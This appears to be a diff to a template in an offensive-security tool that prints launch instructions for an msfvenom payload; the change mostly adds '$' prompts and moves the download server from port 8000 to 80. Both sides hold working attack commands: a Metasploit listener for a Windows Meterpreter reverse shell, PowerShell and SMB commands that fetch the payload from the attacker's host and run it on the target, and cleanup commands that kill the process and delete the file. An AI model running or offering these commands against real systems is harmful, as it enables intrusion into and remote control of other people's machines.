@@ -56,15 +56,15 @@ output:
     Basic MSFVenom Payload - Launch Instructions
 
     Start Listener:
-    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    $ msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
 
     Transfer and Execute:
-    python3 -m http.server 8000
-    On target: powershell -c "IWR -Uri http://{{ lhost }}:8000/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    $ python3 -m http.server 80
+    $ powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
 
     Alternative (SMB):
-    impacket-smbserver share . -smb2support
-    On target: copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }} && {{ output_file }}
+    $ impacket-smbserver share . -smb2support
+    $ copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }} && {{ output_file }}
 
     Notes:
     - Staged payload: Requires network connectivity to {{ lhost }}:{{ lport }} to download full Meterpreter DLL
@@ -81,5 +81,5 @@ output:
 
     Cleanup:
     On target:
-    taskkill /F /IM {{ output_file }} 2>nul
-    del {{ output_file }}
+    $ taskkill /F /IM {{ output_file }} 2>nul
+    $ del {{ output_file }}
